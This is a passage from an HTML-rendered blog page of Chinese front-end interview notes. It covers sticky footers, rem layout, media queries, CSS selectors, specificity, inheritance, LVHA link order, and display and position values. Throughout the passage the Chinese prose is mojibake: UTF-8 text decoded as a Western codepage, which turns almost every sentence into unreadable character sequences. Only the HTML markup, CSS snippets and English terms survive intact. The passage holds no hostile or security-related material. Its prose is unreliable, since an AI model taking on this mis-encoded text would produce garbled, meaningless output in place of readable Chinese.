title="2.å®ç°æ­¥éª¤"></a>2.å®ç°æ­¥éª¤</h3><p>(1)footerå¿…é¡»æ˜¯ä¸€ä¸ªç‹¬ç«‹çš„ç»“æ„ï¼Œä¸wrapæ²¡æœ‰ä»»ä½•åµŒå¥—å…³ç³»</p><p>(2)wrapåŒºåŸŸçš„é«˜åº¦é€šè¿‡è®¾ç½®min-heightï¼Œå˜ä¸ºè§†å£é«˜åº¦</p><p>(3)footerè¦ä½¿ç”¨marginä¸ºè´Ÿæ¥ç¡®å®šè‡ªå·±çš„ä½ç½®</p><p>(4)åœ¨mainåŒºåŸŸéœ€è¦è®¾ç½® padding-bottomã€‚è¿™ä¹Ÿæ˜¯ä¸ºäº†é˜²æ­¢è´Ÿ margin å¯¼è‡´ footer è¦†ç›–ä»»ä½•å®é™…å†…å®¹ã€‚</p><h2 id="rem-å¸ƒå±€çš„ä¼˜ç¼ºç‚¹ï¼Ÿ"><a href="#rem-å¸ƒå±€çš„ä¼˜ç¼ºç‚¹ï¼Ÿ" class="headerlink" title="rem å¸ƒå±€çš„ä¼˜ç¼ºç‚¹ï¼Ÿ"></a>rem å¸ƒå±€çš„ä¼˜ç¼ºç‚¹ï¼Ÿ</h2><p>ä¼˜ç‚¹ï¼š<br>åœ¨å±å¹•åˆ†è¾¨ç‡åƒå·®ä¸‡åˆ«çš„æ—¶ä»£ï¼Œåªè¦å°†remä¸å±å¹•åˆ†è¾¨ç‡å…³è”èµ·æ¥å°±å¯ä»¥å®ç°é¡µé¢çš„æ•´ä½“ç¼©æ”¾ï¼Œä½¿å¾—åœ¨è®¾å¤‡ä¸Šçš„å±•ç°éƒ½ç»Ÿä¸€èµ·æ¥äº†ã€‚è€Œä¸”ç°åœ¨æµè§ˆå™¨åŸºæœ¬éƒ½å·²ç»æ”¯æŒremäº†ï¼Œå…¼å®¹æ€§ä¹Ÿéå¸¸çš„å¥½ã€‚</p><p>ç¼ºç‚¹ï¼š<br>ï¼ˆ1ï¼‰åœ¨å¥‡è‘©çš„dprè®¾å¤‡ä¸Šè¡¨ç°æ•ˆæœä¸å¤ªå¥½ï¼Œæ¯”å¦‚ä¸€äº›åä¸ºçš„é«˜ç«¯æœºå‹ç”¨remå¸ƒå±€ä¼šå‡ºç°é”™ä¹±ã€‚<br>ï¼ˆ2ï¼‰ä½¿ç”¨iframeå¼•ç”¨ä¹Ÿä¼šå‡ºç°é—®é¢˜ã€‚<br>ï¼ˆ3ï¼‰remåœ¨å¤šå±å¹•å°ºå¯¸é€‚é…ä¸Šä¸å½“å‰ä¸¤å¤§å¹³å°çš„è®¾è®¡å“²å­¦ä¸ä¸€è‡´ã€‚å³å¤§å±çš„å‡ºç°åˆ°åº•æ˜¯ä¸ºäº†çœ‹å¾—åˆå¤§åˆæ¸…æ¥šï¼Œè¿˜æ˜¯ä¸ºäº†çœ‹çš„æ›´å¤šçš„é—®é¢˜ã€‚</p><h1 id="Flexå¸ƒå±€"><a href="#Flexå¸ƒå±€" class="headerlink" title="Flexå¸ƒå±€"></a>Flexå¸ƒå±€</h1><p>å†…å®¹å‚è€ƒè‡ª<a href="https://juejin.cn/post/6866914148387651592">ã€Œä¸€åŠ³æ°¸é€¸ã€48å¼ å°å›¾å¸¦ä½ é¢†ç•¥flexå¸ƒå±€ä¹‹ç¾</a></p><h1 id="CSSåŸºç¡€çŸ¥è¯†"><a href="#CSSåŸºç¡€çŸ¥è¯†" class="headerlink" title="CSSåŸºç¡€çŸ¥è¯†"></a>CSSåŸºç¡€çŸ¥è¯†</h1><h2 id="ä»€ä¹ˆæ˜¯å“åº”å¼è®¾è®¡ï¼Ÿå“åº”å¼è®¾è®¡çš„åŸºæœ¬åŸç†æ˜¯ä»€ä¹ˆï¼Ÿå¦‚ä½•å…¼å®¹ä½ç‰ˆæœ¬çš„IEï¼Ÿ"><a href="#ä»€ä¹ˆæ˜¯å“åº”å¼è®¾è®¡ï¼Ÿå“åº”å¼è®¾è®¡çš„åŸºæœ¬åŸç†æ˜¯ä»€ä¹ˆï¼Ÿå¦‚ä½•å…¼å®¹ä½ç‰ˆæœ¬çš„IEï¼Ÿ" class="headerlink" title="ä»€ä¹ˆæ˜¯å“åº”å¼è®¾è®¡ï¼Ÿå“åº”å¼è®¾è®¡çš„åŸºæœ¬åŸç†æ˜¯ä»€ä¹ˆï¼Ÿå¦‚ä½•å…¼å®¹ä½ç‰ˆæœ¬çš„IEï¼Ÿ"></a>ä»€ä¹ˆæ˜¯å“åº”å¼è®¾è®¡ï¼Ÿå“åº”å¼è®¾è®¡çš„åŸºæœ¬åŸç†æ˜¯ä»€ä¹ˆï¼Ÿå¦‚ä½•å…¼å®¹ä½ç‰ˆæœ¬çš„IEï¼Ÿ</h2><p>å“åº”å¼ç½‘ç«™è®¾è®¡<code>ï¼ˆResponsive Web design</code>ï¼‰æ˜¯ä¸€ä¸ªç½‘ç«™èƒ½å¤Ÿå…¼å®¹å¤šä¸ªç»ˆç«¯ï¼Œè€Œä¸æ˜¯ä¸ºæ¯ä¸€ä¸ªç»ˆç«¯åšä¸€ä¸ªç‰¹å®šçš„ç‰ˆæœ¬ã€‚</p><p>åŸç†ï¼š åŸºæœ¬åŸç†æ˜¯é€šè¿‡åª’ä½“æŸ¥è¯¢<code>ï¼ˆ@mediaï¼‰</code>æŸ¥è¯¢æ£€æµ‹ä¸åŒçš„è®¾å¤‡å±å¹•å°ºå¯¸åšå¤„ç†ã€‚</p><p>å…¼å®¹ï¼š é¡µé¢å¤´éƒ¨å¿…é¡»æœ‰mateå£°æ˜çš„<code>viewport</code>ã€‚</p><h3 id="ç§»åŠ¨ç«¯çš„å¸ƒå±€ç”¨è¿‡åª’ä½“æŸ¥è¯¢å—ï¼Ÿ"><a href="#ç§»åŠ¨ç«¯çš„å¸ƒå±€ç”¨è¿‡åª’ä½“æŸ¥è¯¢å—ï¼Ÿ" class="headerlink" title="ç§»åŠ¨ç«¯çš„å¸ƒå±€ç”¨è¿‡åª’ä½“æŸ¥è¯¢å—ï¼Ÿ"></a>ç§»åŠ¨ç«¯çš„å¸ƒå±€ç”¨è¿‡åª’ä½“æŸ¥è¯¢å—ï¼Ÿ</h3><p>é€šè¿‡åª’ä½“æŸ¥è¯¢å¯ä»¥ä¸ºä¸åŒå¤§å°å’Œå°ºå¯¸çš„åª’ä½“å®šä¹‰ä¸åŒçš„cssï¼Œé€‚åº”ç›¸åº”çš„è®¾å¤‡çš„æ˜¾ç¤ºã€‚</p><ol><li><p>&lt;head&gt;é‡Œé¢</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span> <span class="attr">href</span>=<span class="string">&quot;xxx.css&quot;</span> <span class="attr">media</span>=<span class="string">&quot;only screen and (max-device-width:480px)&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>CSS : </p><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="keyword">@media</span> <span class="keyword">only</span> screen <span class="keyword">and</span> (<span class="attribute">max-device-width</span>:<span class="number">480px</span>) &#123;<span class="comment">/*cssæ ·å¼*/</span>&#125;</span><br></pre></td></tr></table></figure></li></ol><h2 id="CSSé€‰æ‹©ç¬¦æœ‰å“ªäº›ï¼Ÿ"><a href="#CSSé€‰æ‹©ç¬¦æœ‰å“ªäº›ï¼Ÿ" class="headerlink" title="CSSé€‰æ‹©ç¬¦æœ‰å“ªäº›ï¼Ÿ"></a>CSSé€‰æ‹©ç¬¦æœ‰å“ªäº›ï¼Ÿ</h2><p>å¸¸è§çš„é€‰æ‹©ç¬¦æœ‰ä»¥ä¸‹ï¼š</p><ol><li><code>id</code>é€‰æ‹©å™¨ï¼ˆ<code>#content</code>ï¼‰</li><li>ç±»é€‰æ‹©å™¨ï¼ˆ<code>.content</code>ï¼‰,</li><li>æ ‡ç­¾é€‰æ‹©å™¨ï¼ˆ<code>div</code>, <code>p</code>, <code>span</code>ç­‰ï¼‰,</li><li>åä»£é€‰æ‹©å™¨ï¼ˆ<code>li a</code>ï¼‰</li><li>ç›¸é‚»åä»£é€‰æ‹©å™¨ï¼ˆå­ï¼‰é€‰æ‹©å™¨ï¼ˆ<code>ul&gt;li</code>ï¼‰</li><li>å…„å¼Ÿé€‰æ‹©å™¨ï¼ˆ<code>li~a</code>ï¼‰</li><li>ç›¸é‚»å…„å¼Ÿé€‰æ‹©å™¨ï¼ˆ<code>h1+p</code>ï¼‰</li><li>é€šé…ç¬¦é€‰æ‹©å™¨ï¼ˆ<code>*</code>ï¼‰</li><li>å±æ€§é€‰æ‹©å™¨ï¼ˆ<code>a[rel = &quot;external&quot;]</code>ï¼‰</li><li>ä¼ªç±»é€‰æ‹©å™¨ï¼ˆ<code>a:hover</code>, <code>li:nth-child</code>ï¼‰</li><li>ä¼ªå…ƒç´ é€‰æ‹©å™¨ï¼ˆ<code>::beforeã€::after</code>ï¼‰</li></ol><h2 id="CSSä¼˜å…ˆçº§ç®—æ³•å¦‚ä½•è®¡ç®—ï¼Ÿ"><a href="#CSSä¼˜å…ˆçº§ç®—æ³•å¦‚ä½•è®¡ç®—ï¼Ÿ" class="headerlink" title="CSSä¼˜å…ˆçº§ç®—æ³•å¦‚ä½•è®¡ç®—ï¼Ÿ"></a>CSSä¼˜å…ˆçº§ç®—æ³•å¦‚ä½•è®¡ç®—ï¼Ÿ</h2><p>CSSçš„ä¼˜å…ˆçº§æ˜¯æ ¹æ®æ ·å¼å£°æ˜çš„ç‰¹æ®Šæ€§å€¼æ¥åˆ¤æ–­çš„ã€‚é€‰æ‹©å™¨çš„ç‰¹æ®Šæ€§å€¼åˆ†ä¸ºå››ä¸ªç­‰çº§ï¼Œå¦‚ä¸‹ï¼š</p><p>ï¼ˆ1ï¼‰æ ‡ç­¾å†…é€‰æ‹©ç¬¦  x,0,0,0<br>ï¼ˆ2ï¼‰IDé€‰æ‹©ç¬¦  0,x,0,0<br>ï¼ˆ3ï¼‰classé€‰æ‹©ç¬¦/å±æ€§é€‰æ‹©ç¬¦/ä¼ªç±»é€‰æ‹©ç¬¦  0,0,x,0<br>ï¼ˆ4ï¼‰å…ƒç´ å’Œä¼ªå…ƒç´ é€‰æ‹©ç¬¦  0,0,0,x</p><p><strong>è®¡ç®—æ–¹æ³•ï¼š</strong></p><p>ï¼ˆ1ï¼‰æ¯ä¸ªç­‰çº§çš„åˆå§‹å€¼ä¸º0<br>ï¼ˆ2ï¼‰æ¯ä¸ªç­‰çº§çš„å åŠ ä¸ºé€‰æ‹©å™¨å‡ºç°çš„æ¬¡æ•°ç›¸åŠ <br>ï¼ˆ3ï¼‰ä¸å¯è¿›ä½ï¼Œæ¯”å¦‚0,99,99,99<br>ï¼ˆ4ï¼‰ä¾æ¬¡è¡¨ç¤ºä¸ºï¼š0,0,0,0<br>ï¼ˆ5ï¼‰æ¯ä¸ªç­‰çº§è®¡æ•°ä¹‹é—´æ²¡å…³è”<br>ï¼ˆ6ï¼‰ç­‰çº§åˆ¤æ–­ä»å·¦å‘å³ï¼Œå¦‚æœæŸä¸€ä½æ•°å€¼ç›¸åŒï¼Œåˆ™åˆ¤æ–­ä¸‹ä¸€ä½æ•°å€¼<br>ï¼ˆ7ï¼‰å¦‚æœä¸¤ä¸ªä¼˜å…ˆçº§ç›¸åŒï¼Œåˆ™æœ€åå‡ºç°çš„ä¼˜å…ˆçº§é«˜ï¼Œ!importantä¹Ÿé€‚ç”¨<br>ï¼ˆ8ï¼‰é€šé…ç¬¦é€‰æ‹©å™¨çš„ç‰¹æ®Šæ€§å€¼ä¸ºï¼š0,0,0,0<br>ï¼ˆ9ï¼‰ç»§æ‰¿æ ·å¼ä¼˜å…ˆçº§æœ€ä½ï¼Œé€šé…ç¬¦æ ·å¼ä¼˜å…ˆçº§é«˜äºç»§æ‰¿æ ·å¼<br>ï¼ˆ10ï¼‰!importantï¼ˆæƒé‡ï¼‰ï¼Œå®ƒæ²¡æœ‰ç‰¹æ®Šæ€§å€¼ï¼Œä½†å®ƒçš„ä¼˜å…ˆçº§æ˜¯æœ€é«˜çš„ï¼Œä¸ºäº†æ–¹ä¾¿è®°å¿†ï¼Œå¯ä»¥è®¤ä¸ºå®ƒçš„ç‰¹æ®Šæ€§å€¼ä¸º1,0,0,0,0ã€‚</p><p><strong>æ³¨æ„ï¼š</strong><br>ï¼ˆ1ï¼‰æ ·å¼åº”ç”¨æ—¶ï¼Œcssä¼šå…ˆæŸ¥çœ‹è§„åˆ™çš„æƒé‡ï¼ˆ!importantï¼‰ï¼ŒåŠ äº†æƒé‡çš„ä¼˜å…ˆçº§æœ€é«˜ï¼Œå½“æƒé‡ç›¸åŒçš„æ—¶å€™ï¼Œä¼šæ¯”è¾ƒè§„åˆ™çš„ç‰¹æ®Šæ€§ã€‚</p><p>ï¼ˆ2ï¼‰ç‰¹æ®Šæ€§å€¼è¶Šå¤§çš„å£°æ˜ä¼˜å…ˆçº§è¶Šé«˜ã€‚</p><p>ï¼ˆ3ï¼‰ç›¸åŒç‰¹æ®Šæ€§å€¼çš„å£°æ˜ï¼Œæ ¹æ®æ ·å¼å¼•å…¥çš„é¡ºåºï¼Œåå£°æ˜çš„è§„åˆ™ä¼˜å…ˆçº§é«˜ï¼ˆè·ç¦»å…ƒç´ å‡ºç°æœ€è¿‘çš„ï¼‰</p><p>  (4) éƒ¨åˆ†æµè§ˆå™¨ç”±äºå­—èŠ‚æº¢å‡ºé—®é¢˜å‡ºç°çš„è¿›ä½è¡¨ç°ä¸åšè€ƒè™‘</p><p><strong>å›ç­”</strong></p><p>åˆ¤æ–­ä¼˜å…ˆçº§æ—¶ï¼Œé¦–å…ˆæˆ‘ä»¬ä¼šåˆ¤æ–­ä¸€æ¡å±æ€§å£°æ˜æ˜¯å¦æœ‰æƒé‡ï¼Œä¹Ÿå°±æ˜¯æ˜¯å¦åœ¨å£°æ˜åé¢åŠ ä¸Šäº†!importantã€‚ä¸€æ¡å£°æ˜å¦‚æœåŠ ä¸Šäº†æƒé‡ï¼Œé‚£ä¹ˆå®ƒçš„ä¼˜å…ˆçº§å°±æ˜¯æœ€é«˜çš„ï¼Œå‰ææ˜¯å®ƒä¹‹åä¸å†å‡ºç°ç›¸åŒæƒé‡çš„å£°æ˜ã€‚å¦‚æœæƒé‡ç›¸åŒï¼Œæˆ‘ä»¬åˆ™éœ€è¦å»æ¯”è¾ƒåŒ¹é…è§„åˆ™çš„ç‰¹æ®Šæ€§ã€‚</p><p>ä¸€æ¡åŒ¹é…è§„åˆ™ä¸€èˆ¬ç”±å¤šä¸ªé€‰æ‹©å™¨ç»„æˆï¼Œä¸€æ¡è§„åˆ™çš„ç‰¹æ®Šæ€§ç”±ç»„æˆå®ƒçš„é€‰æ‹©å™¨çš„ç‰¹æ®Šæ€§ç´¯åŠ è€Œæˆã€‚é€‰æ‹©å™¨çš„ç‰¹æ®Šæ€§å¯ä»¥åˆ†ä¸ºå››ä¸ªç­‰çº§ï¼Œç¬¬ä¸€ä¸ªç­‰çº§æ˜¯è¡Œå†…æ ·å¼ï¼Œä¸º1000ï¼Œç¬¬äºŒä¸ªç­‰çº§æ˜¯idé€‰æ‹©å™¨ï¼Œä¸º0100ï¼Œç¬¬ä¸‰ä¸ªç­‰çº§æ˜¯ç±»é€‰æ‹©å™¨ã€ä¼ªç±»é€‰æ‹©å™¨å’Œå±æ€§é€‰æ‹©å™¨ï¼Œä¸º0010ï¼Œç¬¬å››ä¸ªç­‰çº§æ˜¯å…ƒç´ é€‰æ‹©å™¨å’Œä¼ªå…ƒç´ é€‰æ‹©å™¨ï¼Œä¸º0001ã€‚è§„åˆ™ä¸­æ¯å‡ºç°ä¸€ä¸ªé€‰æ‹©å™¨ï¼Œå°±å°†å®ƒçš„ç‰¹æ®Šæ€§è¿›è¡Œå åŠ ï¼Œè¿™ä¸ªå åŠ åªé™äºå¯¹åº”çš„ç­‰çº§çš„å åŠ ï¼Œä¸ä¼šäº§ç”Ÿè¿›ä½ã€‚é€‰æ‹©å™¨ç‰¹æ®Šæ€§å€¼çš„æ¯”è¾ƒæ˜¯ä»å·¦å‘å³æ’åºçš„ï¼Œä¹Ÿå°±æ˜¯è¯´ä»¥1å¼€å¤´çš„ç‰¹æ®Šæ€§å€¼æ¯”æ‰€æœ‰ä»¥0å¼€å¤´çš„ç‰¹æ®Šæ€§å€¼è¦å¤§ã€‚æ¯”å¦‚è¯´ç‰¹æ®Šæ€§å€¼ä¸º1000çš„çš„è§„åˆ™ä¼˜å…ˆçº§å°±è¦æ¯”ç‰¹æ®Šæ€§å€¼ä¸º0999çš„è§„åˆ™é«˜ã€‚å¦‚æœä¸¤ä¸ªè§„åˆ™çš„ç‰¹æ®Šæ€§å€¼ç›¸ç­‰çš„æ—¶å€™ï¼Œé‚£ä¹ˆå°±ä¼šæ ¹æ®å®ƒä»¬å¼•å…¥çš„é¡ºåºï¼Œåå‡ºç°çš„è§„åˆ™çš„ä¼˜å…ˆçº§æœ€é«˜ã€‚</p><h2 id="CSS-ä¸­å“ªäº›å±æ€§å¯ä»¥ç»§æ‰¿ï¼Ÿ"><a href="#CSS-ä¸­å“ªäº›å±æ€§å¯ä»¥ç»§æ‰¿ï¼Ÿ" class="headerlink" title="CSS ä¸­å“ªäº›å±æ€§å¯ä»¥ç»§æ‰¿ï¼Ÿ"></a>CSS ä¸­å“ªäº›å±æ€§å¯ä»¥ç»§æ‰¿ï¼Ÿ</h2><p>æœ‰ç»§æ‰¿æ€§çš„å±æ€§ï¼š</p><p>ï¼ˆ1ï¼‰å­—ä½“ç³»åˆ—å±æ€§<br>fontã€font-familyã€font-weightã€font-sizeã€font-styleã€font-variantã€font-stretchã€font-size-adjust</p><p>ï¼ˆ2ï¼‰æ–‡æœ¬ç³»åˆ—å±æ€§<br>text-indentã€text-alignã€text-shadowã€line-heightã€word-spacingã€letter-spacingã€<br>text-transformã€directionã€color</p><p>ï¼ˆ3ï¼‰è¡¨æ ¼å¸ƒå±€å±æ€§<br>caption-side border-collapse empty-cells</p><p>ï¼ˆ4ï¼‰åˆ—è¡¨å±æ€§<br>list-style-typeã€list-style-imageã€list-style-positionã€list-style</p><p>ï¼ˆ5ï¼‰å…‰æ ‡å±æ€§<br>cursor</p><p>ï¼ˆ6ï¼‰å…ƒç´ å¯è§æ€§<br>visibility</p><p>ï¼ˆ7ï¼‰è¿˜æœ‰ä¸€äº›ä¸å¸¸ç”¨çš„</p><p>speakï¼Œpageï¼Œè®¾ç½®åµŒå¥—å¼•ç”¨çš„å¼•å·ç±»å‹quotesç­‰å±æ€§</p><p>æ³¨æ„ï¼šå½“ä¸€ä¸ªå±æ€§ä¸æ˜¯ç»§æ‰¿å±æ€§æ—¶ï¼Œå¯ä»¥ä½¿ç”¨inheritå…³é”®å­—æŒ‡å®šä¸€ä¸ªå±æ€§åº”ä»çˆ¶å…ƒç´ ç»§æ‰¿å®ƒçš„å€¼ï¼Œinheritå…³é”®å­—ç”¨äºæ˜¾å¼åœ°æŒ‡å®šç»§æ‰¿æ€§ï¼Œå¯ç”¨äºä»»ä½•ç»§æ‰¿æ€§/éç»§æ‰¿æ€§å±æ€§ã€‚</p><h2 id="å…³äºä¼ªç±»-LVHA-çš„è§£é‡Š"><a href="#å…³äºä¼ªç±»-LVHA-çš„è§£é‡Š" class="headerlink" title="å…³äºä¼ªç±» LVHA çš„è§£é‡Š?"></a>å…³äºä¼ªç±» LVHA çš„è§£é‡Š?</h2><p>aæ ‡ç­¾æœ‰å››ç§çŠ¶æ€ï¼šé“¾æ¥è®¿é—®å‰ã€é“¾æ¥è®¿é—®åã€é¼ æ ‡æ»‘è¿‡ã€æ¿€æ´»ï¼Œåˆ†åˆ«å¯¹åº”å››ç§ä¼ªç±»:linkã€:visitedã€:hoverã€:activeï¼›</p><p>å½“é“¾æ¥æœªè®¿é—®è¿‡æ—¶ï¼š</p><p>ï¼ˆ1ï¼‰å½“é¼ æ ‡æ»‘è¿‡aé“¾æ¥æ—¶ï¼Œæ»¡è¶³:linkå’Œ:hoverä¸¤ç§çŠ¶æ€ï¼Œè¦æ”¹å˜aæ ‡ç­¾çš„é¢œè‰²ï¼Œå°±å¿…é¡»å°†:hoverä¼ªç±»åœ¨:linkä¼ªç±»åé¢å£°æ˜ï¼›<br>ï¼ˆ2ï¼‰å½“é¼ æ ‡ç‚¹å‡»æ¿€æ´»aé“¾æ¥æ—¶ï¼ŒåŒæ—¶æ»¡è¶³:linkã€:hoverã€:activeä¸‰ç§çŠ¶æ€ï¼Œè¦æ˜¾ç¤ºaæ ‡ç­¾æ¿€æ´»æ—¶çš„æ ·å¼ï¼ˆ:activeï¼‰ï¼Œå¿…é¡»å°†:activeå£°æ˜æ”¾åˆ°:linkå’Œ:hoverä¹‹åã€‚å› æ­¤å¾—å‡ºLVHAè¿™ä¸ªé¡ºåºã€‚</p><p>å½“é“¾æ¥è®¿é—®è¿‡æ—¶ï¼Œæƒ…å†µåŸºæœ¬åŒä¸Šï¼Œåªä¸è¿‡éœ€è¦å°†:linkæ¢æˆ:visitedã€‚</p><p>è¿™ä¸ªé¡ºåºèƒ½ä¸èƒ½å˜ï¼Ÿå¯ä»¥ï¼Œä½†ä¹Ÿåªæœ‰:linkå’Œ:visitedå¯ä»¥äº¤æ¢ä½ç½®ï¼Œå› ä¸ºä¸€ä¸ªé“¾æ¥è¦ä¹ˆè®¿é—®è¿‡è¦ä¹ˆæ²¡è®¿é—®è¿‡ï¼Œä¸å¯èƒ½åŒæ—¶æ»¡è¶³ï¼Œä¹Ÿå°±ä¸å­˜åœ¨è¦†ç›–çš„é—®é¢˜ã€‚</p><h2 id="display-æœ‰å“ªäº›å€¼ï¼Ÿè¯´æ˜ä»–ä»¬çš„ä½œç”¨ã€‚"><a href="#display-æœ‰å“ªäº›å€¼ï¼Ÿè¯´æ˜ä»–ä»¬çš„ä½œç”¨ã€‚" class="headerlink" title="display æœ‰å“ªäº›å€¼ï¼Ÿè¯´æ˜ä»–ä»¬çš„ä½œç”¨ã€‚"></a>display æœ‰å“ªäº›å€¼ï¼Ÿè¯´æ˜ä»–ä»¬çš„ä½œç”¨ã€‚</h2><ul><li>block    å—ç±»å‹ã€‚é»˜è®¤å®½åº¦ä¸ºçˆ¶å…ƒç´ å®½åº¦ï¼Œå¯è®¾ç½®å®½é«˜ï¼Œæ¢è¡Œæ˜¾ç¤ºã€‚</li><li>none    å…ƒç´ ä¸æ˜¾ç¤ºï¼Œå¹¶ä»æ–‡æ¡£æµä¸­ç§»é™¤ã€‚</li><li>inline    è¡Œå†…å…ƒç´ ç±»å‹ã€‚é»˜è®¤å®½åº¦ä¸ºå†…å®¹å®½åº¦ï¼Œä¸å¯è®¾ç½®å®½é«˜ï¼ŒåŒè¡Œæ˜¾ç¤ºã€‚</li><li>inline-block é»˜è®¤å®½åº¦ä¸ºå†…å®¹å®½åº¦ï¼Œå¯ä»¥è®¾ç½®å®½é«˜ï¼ŒåŒè¡Œæ˜¾ç¤ºã€‚</li><li>list-item    åƒå—ç±»å‹å…ƒç´ ä¸€æ ·æ˜¾ç¤ºï¼Œå¹¶æ·»åŠ æ ·å¼åˆ—è¡¨æ ‡è®°ã€‚</li><li>table    æ­¤å…ƒç´ ä¼šä½œä¸ºå—çº§è¡¨æ ¼æ¥æ˜¾ç¤ºã€‚</li><li>inherit    è§„å®šåº”è¯¥ä»çˆ¶å…ƒç´ ç»§æ‰¿displayå±æ€§çš„å€¼ã€‚</li></ul><h2 id="position-çš„å€¼-relative-å’Œ-absolute-å®šä½åŸç‚¹æ˜¯ï¼Ÿ"><a href="#position-çš„å€¼-relative-å’Œ-absolute-å®šä½åŸç‚¹æ˜¯ï¼Ÿ" class="headerlink" title="position çš„å€¼ relative å’Œ absolute å®šä½åŸç‚¹æ˜¯ï¼Ÿ"></a>position çš„å€¼ relative å’Œ absolute å®šä½åŸç‚¹æ˜¯ï¼Ÿ</h2><ul><li><p>absolute<br>ç”Ÿæˆç»å¯¹å®šä½çš„å…ƒç´ ï¼Œç›¸å¯¹äºå€¼ä¸ä¸ºstaticçš„ç¬¬ä¸€ä¸ªçˆ¶å…ƒç´ çš„padding boxè¿›è¡Œå®šä½ï¼Œä¹Ÿå¯ä»¥ç†è§£ä¸ºç¦»è‡ªå·±è¿™ä¸€çº§å…ƒç´ æœ€è¿‘çš„ä¸€çº§positionè®¾ç½®ä¸ºabsoluteæˆ–è€…relativeçš„çˆ¶å…ƒç´ çš„padding boxçš„å·¦ä¸Šè§’ä¸ºåŸç‚¹çš„ã€‚</p></li><li><p>fixedï¼ˆè€IEä¸æ”¯æŒï¼‰<br>ç”Ÿæˆç»å¯¹å®šä½çš„å…ƒç´ ï¼Œç›¸å¯¹äºæµè§ˆå™¨çª—å£è¿›è¡Œå®šä½ã€‚</p></li><li><p>relative<br>ç”Ÿæˆç›¸å¯¹å®šä½çš„å…ƒç´ ï¼Œç›¸å¯¹äºå…¶å…ƒç´ æœ¬èº«æ‰€åœ¨æ­£å¸¸ä½ç½®è¿›è¡Œå®šä½ã€‚</p></li><li><p>static<br>é»˜è®¤å€¼ã€‚æ²¡æœ‰å®šä½ï¼Œå…ƒç´ å‡ºç°åœ¨æ­£å¸¸çš„æµä¸­ï¼ˆå¿½ç•¥top,bottom,left,right,z-indexå£°æ˜ï¼‰ã€‚</p></li><li><p>inherit<br>è§„å®šä»çˆ¶å…ƒç´ ç»§æ‰¿positionå±æ€§çš„å€¼ã€‚</p></li></ul><h2 id="ç»å¯¹å®šä½å…ƒç´ ä¸éç»å¯¹å®šä½å…ƒç´ çš„ç™¾åˆ†æ¯”è®¡ç®—çš„åŒºåˆ«"><a href="#ç»å¯¹å®šä½å…ƒç´ ä¸éç»å¯¹å®šä½å…ƒç´ çš„ç™¾åˆ†æ¯”è®¡ç®—çš„åŒºåˆ«" class="headerlink" title="ç»å¯¹å®šä½å…ƒç´ ä¸éç»å¯¹å®šä½å…ƒç´ çš„ç™¾åˆ†æ¯”è®¡ç®—çš„åŒºåˆ«"></a>ç»å¯¹å®šä½å…ƒç´ ä¸éç»å¯¹å®šä½å…ƒç´ çš„ç™¾åˆ†æ¯”è®¡ç®—çš„åŒºåˆ«</h2><ul><li><p>ç»å¯¹å®šä½å…ƒç´ çš„å®½é«˜ç™¾åˆ†æ¯”æ˜¯ç›¸å¯¹äºä¸´è¿‘çš„positionä¸ä¸ºstaticçš„ç¥–å…ˆå…ƒç´ çš„padding boxæ¥è®¡ç®—çš„ã€‚</p></li><li><p>éç»å¯¹å®šä½å…ƒç´ çš„å®½é«˜ç™¾åˆ†æ¯”åˆ™æ˜¯ç›¸å¯¹äºçˆ¶å…ƒç´ çš„content boxæ¥è®¡ç®—çš„ã€‚</p></li></ul><h2 id="li-ä¸-li-ä¹‹é—´æœ‰çœ‹ä¸è§çš„ç©ºç™½é—´éš”æ˜¯ä»€ä¹ˆåŸå› å¼•èµ·çš„ï¼Ÿæœ‰ä»€ä¹ˆè§£å†³åŠæ³•ï¼Ÿ"><a href="#li-ä¸-li-ä¹‹é—´æœ‰çœ‹ä¸è§çš„ç©ºç™½é—´éš”æ˜¯ä»€ä¹ˆåŸå› å¼•èµ·çš„ï¼Ÿæœ‰ä»€ä¹ˆè§£å†³åŠæ³•ï¼Ÿ" class="headerlink" title="li ä¸ li ä¹‹é—´æœ‰çœ‹ä¸è§çš„ç©ºç™½é—´éš”æ˜¯ä»€ä¹ˆåŸå› å¼•èµ·çš„ï¼Ÿæœ‰ä»€ä¹ˆè§£å†³åŠæ³•ï¼Ÿ"></a>li ä¸ li ä¹‹é—´æœ‰çœ‹ä¸è§çš„ç©ºç™½é—´éš”æ˜¯ä»€ä¹ˆåŸå› å¼•èµ·çš„ï¼Ÿæœ‰ä»€ä¹ˆè§£å†³åŠæ³•ï¼Ÿ</h2><p>æµè§ˆå™¨ä¼šæŠŠinlineå…ƒç´ é—´çš„ç©ºç™½å­—ç¬¦ï¼ˆç©ºæ ¼ã€æ¢è¡Œã€Tabç­‰ï¼‰æ¸²æŸ“æˆä¸€ä¸ªç©ºæ ¼ã€‚è€Œä¸ºäº†ç¾è§‚ã€‚æˆ‘ä»¬é€šå¸¸æ˜¯ä¸€ä¸ª<li>æ”¾åœ¨ä¸€è¡Œï¼Œè¿™å¯¼è‡´<li>æ¢è¡Œåäº§ç”Ÿæ¢è¡Œå­—ç¬¦ï¼Œå®ƒå˜æˆä¸€ä¸ªç©ºæ ¼ï¼Œå ç”¨äº†ä¸€ä¸ªå­—ç¬¦çš„å®½åº¦ã€‚</p><p>è§£å†³åŠæ³•ï¼š</p><p>ï¼ˆ1ï¼‰ä¸º<li>è®¾ç½®float:leftã€‚ä¸è¶³ï¼šæœ‰äº›å®¹å™¨æ˜¯ä¸èƒ½è®¾ç½®æµ®åŠ¨ï¼Œå¦‚å·¦å³åˆ‡æ¢çš„ç„¦ç‚¹å›¾ç­‰ã€‚</p><p>ï¼ˆ2ï¼‰å°†æ‰€æœ‰<li>å†™åœ¨åŒä¸€è¡Œã€‚ä¸è¶³ï¼šä»£ç 